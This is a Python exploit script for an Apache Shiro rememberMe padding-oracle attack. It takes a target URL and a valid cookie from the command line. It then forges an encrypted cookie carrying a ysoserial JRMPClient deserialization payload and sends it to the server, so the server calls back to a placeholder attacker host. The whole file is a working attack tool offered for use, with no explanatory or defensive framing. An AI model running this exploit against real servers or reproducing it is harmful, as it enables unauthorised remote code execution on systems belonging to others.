# __author__ = icematcha
import base64, sys, os
import requests
import subprocess


BLOCK_SIZE = 16
PAD_FUNC = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode('latin1')


def xor(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))


def shiro_request(rememberme):
    cookies = {"rememberMe": rememberme}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"}
    # proxies = {"http": "127.0.0.1:8080"}
    res = requests.get(target, cookies=cookies, headers=headers)
    if "deleteMe" not in res.headers["Set-Cookie"]:
        return True
    else:
        return


def xor_iv(back_IV, j):
    _ = bytes()
    for i in range(0, len(back_IV)):
        _ += xor(xor(back_IV[i], chr(j)), chr(j+1)).encode('latin1')
    return _


def padding(cookie, temp_ciphertext, n):
    encryption = base64.b64decode(cookie)
    back_IV = bytes()
    global enc_payload
    enc_payload = temp_ciphertext + enc_payload
    print(f"Get the {n+1}th block encryt payload...")

    for j in range(1, 17):
        head_IV = (chr(0) * (16-j)).encode('latin1')
        for i in range(256):
            enc = bytes()
            IV = head_IV + chr(i).encode('latin1') + back_IV
            enc = encryption + IV + temp_ciphertext
            remeberme = base64.b64encode(enc)
            res = shiro_request(remeberme.decode('latin1'))
            if res:
                back_IV = chr(i).encode('latin1') + back_IV
                if j < 16:
                    back_IV = xor_iv(back_IV.decode('latin1'), j)
                else:
                    back_IV = xor(back_IV.decode('latin1'), '\x10'*16).encode('latin1')
                print(f'back_IV {n}:  {back_IV}')
                break
    _temp_ciphertext = xor(back_IV.decode('latin1'), payload_list[n].decode('latin1')).encode('latin1')

    n -= 1
    if n >= 0:
        print(f'enc_payload: {enc_payload}')
        padding(cookie, _temp_ciphertext, n)
    else:
        enc_payload = _temp_ciphertext + enc_payload
        # print(f'enc_payload: {enc_payload}')
        print('Padding end...')
        print(f'The all enc_payload: {base64.b64encode(enc_payload)}')


if __name__ == '__main__':
    popen = subprocess.Popen(["java", "-jar", r"c:\ysoserial\ysoserial.jar", "JRMPClient", "xxxxx"], stdout=subprocess.PIPE)
    payload = PAD_FUNC(popen.stdout.read())
    payload_list = [payload[i:i+16] for i in range(0, len(payload), 16)]

    if len(sys.argv) != 3:
        print(f'{os.path.split(__file__)[-1]} <target_url> <regular_cookie>') 
        exit()
    target = sys.argv[1]
    enc_payload = bytes()
    padding(sys.argv[2], (chr(15)*16).encode('latin1'), len(payload_list)-1)
    print("Send exp to shiro server...")
    shiro_request(base64.b64encode(enc_payload).decode('latin1'))
